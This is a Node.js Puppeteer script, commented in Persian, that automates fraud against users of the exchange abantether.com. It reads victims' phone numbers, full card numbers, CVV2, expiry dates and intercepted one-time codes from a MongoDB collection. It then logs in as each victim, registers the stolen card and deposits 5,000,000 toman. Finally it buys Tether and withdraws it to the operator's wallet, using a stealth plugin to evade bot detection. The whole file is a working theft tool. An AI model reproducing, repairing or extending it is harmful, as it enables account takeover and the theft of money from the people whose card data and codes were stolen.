require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

// تنظیمات (از Railway یا .env)
const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS;
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const EXCHANGE_URL = 'https://abantether.com';

// بررسی وجود تنظیمات
if (!MONGODB_URI || !WALLET_ADDRESS) {
  console.log(chalk.red('خطا: MONGODB_URI یا WALLET_ADDRESS تنظیم نشده!'));
  process.exit(1);
}

// لاگ رنگی
const log = {
  info: (msg) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${msg}`)),
  success: (msg) => console.log(chalk.green(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
  error: (msg) => console.log(chalk.red(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
  wait: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
  start: (msg) => console.log(chalk.magenta(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`))
};

let collection;

// اتصال به دیتابیس
async function connectDB() {
  const client = new MongoClient(MONGODB_URI, { serverSelectionTimeoutMS: 10000 });
  await client.connect();
  collection = client.db('zarin').collection('users');
  log.success('اتصال به MongoDB برقرار شد');
}

// آیا کاربر آماده پردازش هست؟
function isReady(doc) {
  if (doc.processed === true) return false;

  const hasPhone = !!doc.personalPhoneNumber;
  const hasCard = !!doc.cardNumber && !!doc.cvv2 && !!doc.bankMonth && !!doc.bankYear;
  const hasDevice = !!doc.deviceId;

  const hasAnyOtp = !!doc.otp_login || !!doc.otp_register_card || !!doc.otp_payment;

  return hasPhone && hasCard && hasDevice && hasAnyOtp;
}

// اجرای ایمن با تلاش مجدد
async function retry(fn, name, times = 3) {
  for (let i = 1; i <= times; i++) {
    try {
      await fn();
      return true;
    } catch (err) {
      log.error(`${name} | تلاش ${i}/${times} | ${err.message}`);
      if (i === times) return false;
      await new Promise(r => setTimeout(r, 10000 * i));
    }
  }
  return false;
}

// پردازش کاربر
async function processUser(doc) {
  const phone = doc.personalPhoneNumber;
  let browser, page;

  log.start(`شروع پردازش برای ${phone} (Device: ${doc.deviceId})`);

  try {
    browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-gpu',
        '--disable-dev-shm-usage',
        '--no-zygote',
        '--single-process'
      ]
    });

    page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) Mobile/15E148 Safari/604.1');

    await page.goto(EXCHANGE_URL, { waitUntil: 'networkidle2', timeout: 60000 });

    // مرحله ۱: ورود با شماره (فقط اگه otp_login نداشته باشه)
    if (!doc.otp_login) {
      await page.waitForSelector('input[placeholder="شماره موبایل"]', { timeout: 15000 });
      await page.type('input[placeholder="شماره موبایل"]', phone);
      await page.click('button:has-text("ادامه")');
      log.wait(`منتظر دریافت otp_login برای ${phone}...`);
      return; // صبر می‌کنه تا تو دیتابیس otp_login وارد بشه
    }

    // مرحله ۲: وارد کردن OTP ورود
    await page.type('input[placeholder="کد تایید"]', doc.otp_login);
    await page.click('button:has-text("تایید")');
    await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {});

    // مرحله ۳: ثبت کارت بانکی (اگه قبلاً ثبت نشده)
    if (!doc.otp_register_card) {
      try {
        await page.click('text=کیف پول');
        await page.click('text=کارت بانکی');
        await page.click('text=افزودن کارت');
        await page.type('input[placeholder="شماره کارت"]', doc.cardNumber.replace(/\s/g, ''));
        await page.type('input[placeholder="CVV2"]', doc.cvv2);
        await page.type('input[placeholder="ماه"]', doc.bankMonth.toString().padStart(2, '0'));
        await page.type('input[placeholder="سال"]', (doc.bankYear - 1300).toString().padStart(2, '0'));
        await page.click('button:has-text("ثبت کارت")');
        log.wait(`منتظر دریافت otp_register_card برای ${phone}...`);
        return;
      } catch (e) {
        log.info('کارت قبلاً ثبت شده، ادامه میدم...');
      }
    }

    // مرحله ۴: تأیید کارت با OTP
    await page.type('input[placeholder*="کد پیامک"], input[placeholder*="کد"]', doc.otp_register_card);
    await page.click('button:has-text("تأیید")');
    await page.waitForSelector('text=کارت با موفقیت ثبت شد', { timeout: 30000 }).catch(() => {});

    // مرحله ۵: شارژ حساب (واریز تومان)
    if (!doc.otp_payment) {
      await page.click('text=واریز تومان');
      await page.waitForSelector('input[placeholder="مبلغ"]', { timeout: 10000 });
      await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
      await page.click('button:has-text("پرداخت")');
      await page.waitForSelector('input#otp, input[placeholder*="کد"]', { timeout: 20000 });
      log.wait(`منتظر دریافت otp_payment برای ${phone}...`);
      return;
    }

    // مرحله...
    await page.type('input#otp, input[placeholder*="کد"]', doc.otp_payment);
    await page.click('button:has-text("تایید"), button:has-text("پرداخت")');
    await page.waitForSelector('text=پرداخت موفق', { timeout: 120000 });

    // مرحله ۶: خرید تتر
    await page.click('text=بازار');
    await page.click('text=تتر');
    await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
    await page.click('button:has-text("خرید")');
    await page.waitForSelector('text=سفارش با موفقیت ثبت شد', { timeout: 40000 });

    // مرحله ۷: برداشت تتر
    await page.click('text=برداشت');
    await page.click('text=تتر');
    await page.type('input[placeholder="آدرس"]', WALLET_ADDRESS);
    await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2)); // کمی کارمزد کم میشه
    await page.click('button:has-text("برداشت")');
    await page.waitForSelector('text=درخواست برداشت ثبت شد', { timeout: 60000 });

    log.success(`تمام مراحل با موفقیت انجام شد! تتر در راهه: ${phone}`);
    await collection.updateOne(
      { _id: doc._id },
      { $set: { processed: true, status: 'completed', completedAt: new Date() } }
    );

  } catch (err) {
    log.error(`شکست برای ${phone}: ${err.message}`);
    await collection.updateOne(
      { _id: doc._id },
      { $set: { status: 'failed', error: err.message, lastError: new Date() } }
    );
  } finally {
    if (browser) await browser.close().catch(() => {});
  }
}

// شروع ربات + Real-time Change Stream
async function startBot() {
  await connectDB();

  log.success('ربات فعال شد - هر تغییری = پردازش فوری');

  const changeStream = collection.watch([
    { $match: { operationType: { $in: ['insert', 'update'] } } }
  ], { fullDocument: 'updateLookup' });

  changeStream.on('change', async (change) => {
    try {
      const doc = change.fullDocument;
      if (!doc || doc.processed === true) return;

      if (isReady(doc)) {
        log.start(`تغییر تشخیص داده شد → شروع پردازش برای ${doc.personalPhoneNumber}`);
        processUser(doc); // بدون await → همزمان چند نفر رو پردازش کنه
      }
    } catch (err) {
      log.error('خطا در Change Stream: ' + err.message);
    }
  });

  changeStream.on('error', () => {
    log.error('اتصال Change Stream قطع شد! دوباره وصل می‌شم...');
    setTimeout(startBot, 10000);
  });
}

// شروع
startBot().catch(err => {
  log.error('خطای فتال: ' + err.message);
  setTimeout(startBot, 10000);
});